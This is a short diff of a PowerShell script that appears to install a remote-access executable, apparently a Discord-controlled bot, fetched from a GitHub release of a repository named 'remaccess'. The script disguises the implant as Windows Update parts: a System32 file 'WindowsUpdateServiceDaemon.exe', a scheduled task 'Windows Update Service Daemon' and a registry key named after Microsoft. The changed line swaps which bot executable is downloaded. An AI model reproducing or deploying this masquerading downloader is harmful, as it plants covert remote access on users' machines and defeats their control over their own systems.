@@ -3,7 +3,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
 $filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")
-$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotBot.exe"
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
 $pingdaemontask = "Windows Update Service Daemon"
 $regPath = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
 #Purge of Ping Task
